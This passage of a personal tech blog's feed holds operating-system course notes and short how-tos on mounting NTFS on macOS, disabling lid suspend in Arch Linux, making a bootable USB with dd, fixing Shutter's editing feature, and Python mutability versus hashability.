&lt;li&gt;Provides ability to distinguish when system is running user code or kernel code  &lt;/li&gt;
&lt;li&gt;Some instructions designated as &lt;strong&gt;privileged&lt;/strong&gt;, only executable in kernel mode  &lt;/li&gt;
&lt;li&gt;System call changes mode to kernel, return from call resets it to user  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Transition from User to Kernel Mode  &lt;ul&gt;
&lt;li&gt;Timer to prevent infinite loop / process hogging resources  &lt;ul&gt;
&lt;li&gt;Set interrupt after specific period  &lt;/li&gt;
&lt;li&gt;Operating system decrements counter  &lt;/li&gt;
&lt;li&gt;When counter zero generate an interrupt  &lt;/li&gt;
&lt;li&gt;Set up before scheduling process to regain control or terminate program&lt;br /&gt;
  that exceeds allotted time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Process Management  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Single-threaded process has one &lt;strong&gt;program counter&lt;/strong&gt; specifying location of&lt;br /&gt;
  next instruction to execute  &lt;ul&gt;
&lt;li&gt;Process executes instructions sequentially, one at a time, until completion  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Multi-threaded process has one program counter per thread&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Concurrency by multiplexing the CPUs among the processes / threads  &lt;/li&gt;
&lt;li&gt;Process termination requires reclaim of any reusable resources  &lt;/li&gt;
&lt;li&gt;Activities  &lt;ul&gt;
&lt;li&gt;Creating and deleting both user and system processes  &lt;/li&gt;
&lt;li&gt;Suspending and resuming processes  &lt;/li&gt;
&lt;li&gt;Process synchronization  &lt;/li&gt;
&lt;li&gt;Process communication  &lt;/li&gt;
&lt;li&gt;Deadlock handling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Memory Management  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Determines what is in memory when optimizing CPU utilization and computer response to&lt;br /&gt;
    users  &lt;/li&gt;
&lt;li&gt;Activities  &lt;ul&gt;
&lt;li&gt;Keeping track of which parts of memory are currently being used and by whom  &lt;/li&gt;
&lt;li&gt;Deciding which processes (or parts thereof) and data to move into and out of memory  &lt;/li&gt;
&lt;li&gt;Allocating and deallocating memory space as needed  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Storage Management  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OS provides uniform, logical view of information storage  &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;file&lt;/strong&gt; - Abstracts physical properties to logical storage unit  &lt;/li&gt;
&lt;li&gt;Each medium is controlled by device  &lt;ul&gt;
&lt;li&gt;access speed  &lt;/li&gt;
&lt;li&gt;capacity  &lt;/li&gt;
&lt;li&gt;data-transfer rate  &lt;/li&gt;
&lt;li&gt;access method (sequential or random)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;File-System management  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Access control on most systems to determine who can access what  &lt;/li&gt;
&lt;li&gt;OS Activities  &lt;ul&gt;
&lt;li&gt;Creating and deleting files and directories  &lt;/li&gt;
&lt;li&gt;Primitives to manipulate files and dirs  &lt;/li&gt;
&lt;li&gt;Mapping files onto secondary storage  &lt;/li&gt;
&lt;li&gt;Backup files onto stable (non-volatile) storage media  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Mass-Storage Management  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Disks used to store data that does not fit in main memory or data that must be kept for&lt;br /&gt;
    a “long” period of time  &lt;/li&gt;
&lt;li&gt;WORM (write-once, read-many-times) and RW (read-write)  &lt;/li&gt;
&lt;li&gt;OS activities  &lt;ul&gt;
&lt;li&gt;Free-space management  &lt;/li&gt;
&lt;li&gt;Storage allocation  &lt;/li&gt;
&lt;li&gt;Disk scheduling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Performance of Various Levels of Storage&lt;br /&gt;
&lt;img alt="Performance of Various Levels of Storage" src="/files/os-ch1/performance-of-various-levels-of-storage.png" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Multitasking environments must be careful to use most recent value, no matter where it is stored in the storage hierarchy  &lt;/p&gt;
&lt;p&gt;Multiprocessor environment must provide cache coherency in hardware such that all CPUs have the most recent value in their cache  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;I/O Subsystem  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Memory management of I/O  &lt;ul&gt;
&lt;li&gt;buffering (storing data temporarily while it is being transferred)  &lt;/li&gt;
&lt;li&gt;caching (storing parts of data in faster storage for performance)  &lt;/li&gt;
&lt;li&gt;spooling (the overlapping of output of one job with input of other jobs)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;General device-driver interface  &lt;/li&gt;
&lt;li&gt;Drivers for specific hardware devices  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Protection and Security  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Protection&lt;/strong&gt; – any mechanism for controlling access of processes or users to resources defined by the OS  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Security&lt;/strong&gt; – defense of the system against internal and external attacks  &lt;ul&gt;
&lt;li&gt;denial-of-service, worms, viruses, identity theft, theft of service  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Some properties to check  &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;uid, sid&lt;/strong&gt; - User identities (user IDs, security IDs), User ID then associated with all files, processes of that user to determine access control  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;gid&lt;/strong&gt; - Group identifier (group ID) allows set of users to be defined and controls managed, then also associated with each process, file  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;euid, egid&lt;/strong&gt; - &lt;strong&gt;Privilege escalation&lt;/strong&gt; allows user to change to effective ID with more rights  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Computing Environments  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Compute-server&lt;/strong&gt; provides an interface to client to request services (i.e. database)  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;File-server&lt;/strong&gt; provides interface for clients to store and retrieve files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Peer-to-Peer Computing  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Another model of distributed system  &lt;/li&gt;
&lt;li&gt;P2P does not distinguish clients and servers  &lt;/li&gt;
&lt;li&gt;Node must join P2P network  &lt;/li&gt;
&lt;li&gt;Broadcast request for service and respond to requests for service via discovery protocol  &lt;/li&gt;
&lt;li&gt;Examples include Napster and Gnutella  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Web-Based Computing  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cloud Computing  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Open-Source Operating Systems  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Operating systems made available in source-code format rather than just binary closed-source  &lt;/li&gt;
&lt;li&gt;Counter to the copy protection and Digital Rights Management (DRM) movement  &lt;/li&gt;
&lt;li&gt;Started by Free Software Foundation (FSF), which has “copyleft” GNU Public License (GPL)  &lt;/li&gt;
&lt;li&gt;Examples include &lt;strong&gt;GNU/Linux&lt;/strong&gt;, &lt;strong&gt;BSD UNIX&lt;/strong&gt; (including &lt;strong&gt;core of Mac OS X&lt;/strong&gt;), and &lt;strong&gt;Sun Solaris&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Operating System"></category></entry><entry><title>Mount Windows NTFS filesystem on Mac OSX</title><link href="https://blog.m157q.tw/posts/2013/11/03/mount-windows-ntfs-filesystem-on-mac-osx/" rel="alternate"></link><published>2013-11-03T11:50:00+08:00</published><updated>2013-11-03T11:50:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-03:posts/2013/11/03/mount-windows-ntfs-filesystem-on-mac-osx/</id><summary type="html">&lt;p&gt;Today, I tried to retrieve datas stored in my USB 2.0 external hard drive.&lt;br /&gt;
After I plugged it into my MacBook Air 2013 USB port,&lt;br /&gt;
I didn't see it show up in the sidebar of the finder.&lt;br /&gt;
So I searching the web to find the solution.  &lt;/p&gt;
&lt;p&gt;I find two existed softwares to help Mac user using the NTFS disk:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.paragon-software.com/home/ntfs-mac/"&gt;Paragon NTFS&lt;/a&gt;&lt;br /&gt;
    After I installed it, it just can't read my NTFS external hard drive.&lt;br /&gt;
    (The disk select list of Paragon NTFS is empty)  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.tuxera.com/products/tuxera-ntfs-for-mac/"&gt;Tuxera NTFS&lt;/a&gt;&lt;br /&gt;
    I didn't try it. After I saw it only have 15 days trial version, I just skipped it.  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here are the tips to mount the Windows NTFS filesystem on Mac OSX using command line:  &lt;/p&gt;
&lt;!--more--&gt;

&lt;h1&gt;1. Install ntfs-3g&lt;/h1&gt;
&lt;p&gt;I installed it by using homebrew. If you already installed homebrew as well,&lt;br /&gt;
just type &lt;code&gt;brew install ntfs-3g&lt;/code&gt;&lt;br /&gt;
or you can get the source code of ntfs-3g &lt;a href="http://macntfs-3g.blogspot.tw/"&gt;here&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;2. Load the fuse4x kernel extension&lt;/h1&gt;
&lt;p&gt;After installed ntfs-3g, you neet to load the fuse4x-kext or ntfs-3g will not work.&lt;br /&gt;
follow the instructions given by &lt;code&gt;brew info fuse4x-kext&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo /bin/cp -rfX /usr/local/Cellar/fuse4x-kext/0.9.2/Library/Extensions/fuse4x.kext /Library/Extensions&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo chmod +s /Library/Extensions/fuse4x.kext/Support/load_fuse4x&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;3. Check &amp;amp; Mount NTFS&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;diskutil list&lt;/code&gt; to see the identifier of your NTFS disk. &lt;strong&gt;(for me, it's /dev/disk1s1 here.)&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;diskutil unmount /dev/disk1s1&lt;/code&gt; &lt;strong&gt;(to make sure that the volume is unmounted)&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo mkdir /Volumes/NTFS&lt;/code&gt; &lt;strong&gt;(/Volumes/NTFS could be change to anywhere you want to mount your NTFS)&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo ntfs-3g /dev/disk1s1 /Volumes/NTFS&lt;/code&gt;&lt;br /&gt;
You can go to check the /Volumes/NTFS if the NTFS is mounted succefully or not.  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Unsolved Problem:&lt;br /&gt;
All I could see in my NTFS filesystem are directories.&lt;br /&gt;
All the files in the directories can't be seen in the finder with gui mode.&lt;br /&gt;
So, I just use iTerm2 to cd into the directory, then&lt;br /&gt;
&lt;code&gt;open x.pdf&lt;/code&gt; to open the file with default application.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/mxcl/homebrew/issues/13647"&gt;fuse4x installs properly but kext doesn't get loaded (10.8)&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://blog.taylormcgann.com/2012/07/19/mount-ntfs-drives-on-mac/"&gt;Mount NTFS Drives on Mac&lt;/a&gt;  &lt;/p&gt;</summary><category term="OS X"></category><category term="Mac"></category><category term="Windows"></category><category term="NTFS"></category></entry><entry><title>SNTT - week3</title><link href="https://blog.m157q.tw/posts/2013/11/03/sntt-week3/" rel="alternate"></link><published>2013-11-03T08:18:00+08:00</published><updated>2013-11-03T08:18:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-03:posts/2013/11/03/sntt-week3/</id><summary type="html">&lt;h2&gt;SNTT == Social Network Technology and Trend&lt;/h2&gt;
&lt;h2&gt;note about the week3 course&lt;/h2&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;XML  &lt;ul&gt;
&lt;li&gt;a universally agreed markup meta- language primarily used for information exchange.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;person&amp;gt;&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;lt;id&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;integer&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;1111&lt;span class="nt"&gt;&amp;lt;/id&amp;gt;&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;lt;last_name&amp;gt;&lt;/span&gt;Smith&lt;span class="nt"&gt;&amp;lt;/last_name&amp;gt;&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;lt;first_name&amp;gt;&lt;/span&gt;John&lt;span class="nt"&gt;&amp;lt;/first_name&amp;gt;&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;lt;address&amp;gt;&lt;/span&gt;  
        &lt;span class="nt"&gt;&amp;lt;city&amp;gt;&lt;/span&gt;New York&lt;span class="nt"&gt;&amp;lt;/city&amp;gt;&lt;/span&gt;  
        &lt;span class="nt"&gt;&amp;lt;street&amp;gt;&lt;/span&gt;21 2nd Street&lt;span class="nt"&gt;&amp;lt;/street&amp;gt;&lt;/span&gt;  
        &lt;span class="nt"&gt;&amp;lt;postal_code&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;integer&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;10021&lt;span class="nt"&gt;&amp;lt;/postal_code&amp;gt;&lt;/span&gt;  
        &lt;span class="nt"&gt;&amp;lt;state&amp;gt;&lt;/span&gt;NY&lt;span class="nt"&gt;&amp;lt;/state&amp;gt;&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;lt;/address&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/person&amp;gt;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;JSON – JavaScript Object Notation  &lt;ul&gt;
&lt;li&gt;a lightweight computer data interchange format based on JavaScript  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;quot;firstName&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;John&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;quot;lastName&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Smith&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;quot;address&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
        &lt;span class="nt"&gt;&amp;quot;street&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;21 2nd Street&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
        &lt;span class="nt"&gt;&amp;quot;city&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;New York&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
        &lt;span class="nt"&gt;&amp;quot;state&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
        &lt;span class="nt"&gt;&amp;quot;postalCode&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10021&lt;/span&gt;  
    &lt;span class="p"&gt;},&lt;/span&gt;  
    &lt;span class="nt"&gt;&amp;quot;phoneNumbers&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;  
        &lt;span class="s2"&gt;&amp;quot;212 555-1234&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
        &lt;span class="s2"&gt;&amp;quot;646 555-4567&amp;quot;&lt;/span&gt;  
    &lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Web 2.0  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It was popularized by Tim O'Reilly at the O'Reilly Media Web 2.0 conference in late 2004.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Response Web Design (RWD)&lt;br /&gt;
&lt;img alt="RWD 1" src="/files/sntt-week3/rwd1.png" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The concept of developing a website in a way that allows the layout to adjust according to the user's screen resolution.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The viewport meta tag&lt;br /&gt;
&lt;img alt="RWD 2" src="/files/sntt-week3/rwd2.png" /&gt;  &lt;/li&gt;
&lt;li&gt;Fluid Grid  &lt;/li&gt;
&lt;li&gt;Resizable Images  &lt;/li&gt;
&lt;li&gt;Media Queries  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Web"></category></entry><entry><title>Disable auto suspend while the laptop lid close in Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/10/15/disable-auto-suspend-while-the-laptop-lid-close-in-arch-linux/" rel="alternate"></link><published>2015-10-27T21:24:00+08:00</published><updated>2015-10-27T21:24:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-10-15:posts/2013/10/15/disable-auto-suspend-while-the-laptop-lid-close-in-arch-linux/</id><summary type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Use editor to modify the configuration file of the systemd-logind&lt;br /&gt;
&lt;code&gt;# vim /etc/systemd/logind.conf&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find&lt;br /&gt;
&lt;code&gt;#HandleLidSwitch=suspend&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Uncommnet it and then change it to&lt;br /&gt;
&lt;code&gt;HandleLidSwitch=ignore&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;After saving the modification, we need to restart the systemd-logind&lt;br /&gt;
&lt;code&gt;# systemctl restart systemd-logind&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now the change should be effective now.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://unix.stackexchange.com/questions/52643/how-to-disable-auto-suspend-when-i-close-laptop-lid"&gt;How to disable auto suspend when I close laptop lid?&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="Laptop"></category><category term="systemd"></category></entry><entry><title>How to Create a Bootable USB on Mac OS</title><link href="https://blog.m157q.tw/posts/2013/10/14/how-to-create-a-bootable-usb-on-mac-os/" rel="alternate"></link><published>2013-10-14T11:28:00+08:00</published><updated>2013-10-14T11:28:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-10-14:posts/2013/10/14/how-to-create-a-bootable-usb-on-mac-os/</id><summary type="html">&lt;p&gt;Using Macbook Air 2013 with OSX 10.8.5  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Applications -&amp;gt; Utilities -&amp;gt; Boot Camp Assistant -&amp;gt; continue&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;check the &lt;code&gt;"Create a Windows7 install disk"&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;you need to prepare a usb disk and a Windows7 iso file  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;2013/10/14 failed for making a Windows7 bootable usb disk using the method below  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Convert a iso file into a img file:&lt;br /&gt;
&lt;code&gt;hdiutil convert -format UDRW -o $[name].dmg $[name].iso&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List the disk storage information:&lt;br /&gt;
&lt;code&gt;diskutil list&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You should see the usb disk is one of the /dev/disk?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Unmount the usb disk for writing the img file into the usb:&lt;br /&gt;
&lt;code&gt;diskutil umountDisk /dev/disk?&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use dd command to write the img file into the ubs disk:&lt;br /&gt;
&lt;code&gt;sudo dd -if=$[name].dmg -of=/dev/disk? bs=1m&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If your dd command is GNU version, use:&lt;br /&gt;
&lt;code&gt;sudo dd -if=$[name].dmg -of=/dev/disk? bs=1M&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;After the dd command is completed, eject the usb disk:&lt;br /&gt;
&lt;code&gt;diskutil eject /dev/disk?&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://sealmemory.blogspot.tw/2013/05/create-a-usb-stick-on-mac-osx.html"&gt;http://sealmemory.blogspot.tw/2013/05/create-a-usb-stick-on-mac-osx.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="OS X"></category><category term="Mac"></category><category term="USB"></category><category term="Bootable USB"></category></entry><entry><title>Can't edit pictures while using Shutter</title><link href="https://blog.m157q.tw/posts/2013/06/08/cant-edit-pictures-while-using-shutter/" rel="alternate"></link><published>2017-09-15T17:55:00+08:00</published><updated>2017-09-15T17:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-06-08:posts/2013/06/08/cant-edit-pictures-while-using-shutter/</id><summary type="html">&lt;p&gt;After upgraded my Arch Linux, I just can't edit photos with Shutter while the function of taking screenshots is ok.  &lt;/p&gt;
&lt;p&gt;So, I googled for "shutter can't edit archlinux" and found &lt;a href="http://shutter-project.org/downloads/dependencies/"&gt;this article&lt;/a&gt;.&lt;br /&gt;
The function of editing pics depends on libgoo-canvas-perl  &lt;/p&gt;
&lt;p&gt;In Arch Linux, we just need to type this in terminal  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ yaourt -S libgoo-canvas-perl&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;to install the package from AUR.  &lt;/p&gt;
&lt;p&gt;Then the function of editing pics works fine.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://shutter-project.org/downloads/dependencies/"&gt;Dependencies | Shutter - Feature-rich Screenshot Tool&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="shutter"></category><category term="perl"></category></entry><entry><title>[Python] Mutable v.s Hashable</title><link href="https://blog.m157q.tw/posts/2013/06/05/python-mutable-vs-hashable/" rel="alternate"></link><published>2013-06-05T09:31:00+08:00</published><updated>2013-06-05T09:31:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-06-05:posts/2013/06/05/python-mutable-vs-hashable/</id><summary type="html">&lt;p&gt;Before talk about this, let's see some definitions.  &lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;Mutable Def:&lt;br /&gt;
&lt;a href="http://docs.python.org/3/glossary.html#term-mutable"&gt;Mutable objects can change their value but keep their id().&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Immutable Def:&lt;br /&gt;
&lt;a href="http://docs.python.org/3/glossary.html#term-immutable"&gt;An object with a fixed value. Immutable objects include numbers, strings and&lt;br /&gt;
tuples. Such an object cannot be altered. A new object has to be created if&lt;br /&gt;
a different value has to be stored. They play an important role in places where&lt;br /&gt;
a constant hash value is needed, for example as a key in a dictionary.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Hashable Def:  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/glossary.html#term-hashable"&gt;An object is &lt;em&gt;hashable&lt;/em&gt; if it has a hash value which never changes during&lt;br /&gt;
its lifetime (it needs a &lt;strong&gt;hash&lt;/strong&gt;()method), and can be compared to other objects&lt;br /&gt;
(it needs an &lt;strong&gt;eq&lt;/strong&gt;() method). Hashable objects which compare equal must have&lt;br /&gt;
the same hash value.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/glossary.html#term-hashable"&gt;    Hashability makes an object usable as a dictionary key and a set member,&lt;br /&gt;
because these data structures use the hash value internally.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/glossary.html#term-hashable"&gt;    All of Python’s immutable built-in objects are hashable, while no mutable&lt;br /&gt;
containers (such as lists or dictionaries) are. Objects which are instances&lt;br /&gt;
of user-defined classes are hashable by default; they all compare unequal (except&lt;br /&gt;
with themselves), and their hash value is their id().&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/reference/datamodel.html"&gt;Objects whose value can change are said to be mutable&lt;/a&gt;&lt;a href="http://docs.python.org/3/reference/datamodel.html"&gt;; &lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://docs.python.org/3/reference/datamodel.html"&gt;Objects whose value is unchangeable once they are created are called &lt;em&gt;immutable&lt;/em&gt;. (The value of an immutable container object that contains a reference to  a mutable object can change when the latter’s value is changed; however the  container is still considered immutable, because the collection of objects  it contains cannot be changed. So, immutability is not strictly the same as  having an unchangeable value, it is more subtle.) &lt;/a&gt;&lt;br /&gt;
&lt;a href="http://docs.python.org/3/reference/datamodel.html"&gt;An object’s mutability is determined by its type; for instance, numbers,&lt;br /&gt;
strings and tuples are immutable, while dictionaries, sets and lists are mutable.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;We can use hash() to check if an object is hashable.  &lt;/p&gt;
&lt;p&gt;But there seems no method to check if an object is mutable or not.  &lt;/p&gt;
&lt;p&gt;Google "python mutable check". Seems many people use hash() to check if an&lt;br /&gt;
object is mutable or not...  &lt;/p&gt;
&lt;p&gt;Python documentation said "&lt;a href="http://docs.python.org/3/glossary.html#term-hashable"&gt;All of Python’s immutable built-in objects are&lt;br /&gt;
hashable, while no mutable containers (such as lists or dictionaries) are.&lt;/a&gt;"  &lt;/p&gt;
&lt;p&gt;So... the questions are:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Is there any hashable built-in object is mutable?  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Is there any un-hashable built-in objects is immutable?  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If the answers of the two questions above is "No".&lt;br /&gt;
Then,   &lt;/p&gt;
&lt;ol&gt;
